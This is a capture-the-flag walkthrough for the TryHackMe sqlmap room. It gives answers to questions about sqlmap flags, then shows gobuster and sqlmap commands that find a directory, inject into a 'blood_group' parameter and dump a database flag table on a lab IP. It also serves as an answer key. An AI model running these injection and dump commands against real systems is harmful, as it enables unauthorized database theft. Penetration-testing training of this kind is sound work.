---
description: https://tryhackme.com/room/sqlmap
---

# SQLMAP

## Task 2 Using Sqlmap

#### Which flag or option will allow you to add a URL to the command?

{% hint style="success" %}
`-u`
{% endhint %}

#### Which flag would you use to add data to a POST request?

{% hint style="success" %}
`--data`
{% endhint %}

#### There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?

{% hint style="success" %}
`-p username`
{% endhint %}

#### Which flag would you use to show the advanced help menu?

{% hint style="success" %}
`-hh`
{% endhint %}

#### Which flag allows you to retrieve everything?

{% hint style="success" %}
`-a`
{% endhint %}

#### Which flag allows you to select the database name?

{% hint style="success" %}
`-D`
{% endhint %}

#### Which flag would you use to retrieve database tables?

{% hint style="success" %}
`--tables`
{% endhint %}

#### Which flag allows you to retrieve a table’s columns?

{% hint style="success" %}
`--columns`
{% endhint %}

#### Which flag allows you to dump all the database table entries?-

{% hint style="success" %}
`--dump-all`
{% endhint %}

#### Which flag will give you an interactive SQL Shell prompt?

{% hint style="success" %}
`--sql-shell`
{% endhint %}

#### You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

{% hint style="success" %}
`--dbms=MySQL`
{% endhint %}

## Task 3 SQLMap Challenge

#### What is the name of the interesting directory ?

```bash
gobuster dir -u http://10.10.3.84 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-20-18.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-20-44.png>)

{% hint style="success" %}
`blood`
{% endhint %}

#### Who is the current db user?

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-25-11.png>)

```bash
sqlmap -r req.txt -p blood_group --current-user
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-33-46.png>)

{% hint style="success" %}
`root`
{% endhint %}

#### What is the final flag?

```bash
sqlmap -r req.txt -p blood_group --dbms MySQL --technique U --dbs
sqlmap -r req.txt -p blood_group --dbms MySQL --technique U -D blood --tables
sqlmap -r req.txt -p blood_group --dbms MySQL --technique U -D blood -T flag \
       --dump
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-28-43.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-29-24.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 13-30-29.png>)

{% hint style="success" %}
`thm{sqlm@p_is_L0ve}`
{% endhint %}
